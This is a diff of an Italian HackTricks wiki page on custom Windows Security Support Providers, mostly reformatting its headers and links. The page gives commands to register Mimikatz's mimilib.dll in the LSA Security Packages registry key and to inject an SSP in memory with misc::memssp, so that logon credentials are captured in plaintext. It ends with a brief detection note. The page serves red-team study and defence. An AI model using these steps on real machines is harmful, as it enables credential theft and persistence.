@@ -1,3 +1,5 @@
+# Custom SSP
+
 <details>
 
 <summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
@@ -7,18 +9,17 @@ Altri modi per supportare HackTricks:
 * Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
+### SSP personalizzato
 
-## SSP personalizzato
-
-[Scopri cosa è un SSP (Security Support Provider) qui.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
+[Scopri cosa è un SSP (Security Support Provider) qui.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
 Puoi creare il tuo **SSP** per **catturare** in **testo normale** le **credenziali** utilizzate per accedere alla macchina.
 
-### Mimilib
+#### Mimilib
 
 Puoi utilizzare il binario `mimilib.dll` fornito da Mimikatz. **Questo registrerà all'interno di un file tutte le credenziali in testo normale.**\
 Rilascia la dll in `C:\Windows\System32\`\
@@ -34,24 +35,27 @@ Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\
 {% endcode %}
 
 Aggiungi `mimilib.dll` all'elenco dei provider di supporto alla sicurezza (Security Packages):
+
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
+
 E dopo un riavvio tutte le credenziali possono essere trovate in chiaro nel file `C:\Windows\System32\kiwissp.log`
 
-### In memoria
+#### In memoria
 
 Puoi anche iniettare questo direttamente in memoria usando Mimikatz (nota che potrebbe essere un po' instabile/non funzionante):
+
 ```powershell
 privilege::debug
 misc::memssp
 ```
+
 Questo non sopravviverà ai riavvii.
 
-### Mitigazione
+#### Mitigazione
 
 Event ID 4657 - Audit della creazione/modifica di `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
-
 
 <details>
 
@@ -62,7 +66,7 @@ Altri modi per supportare HackTricks:
 * Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
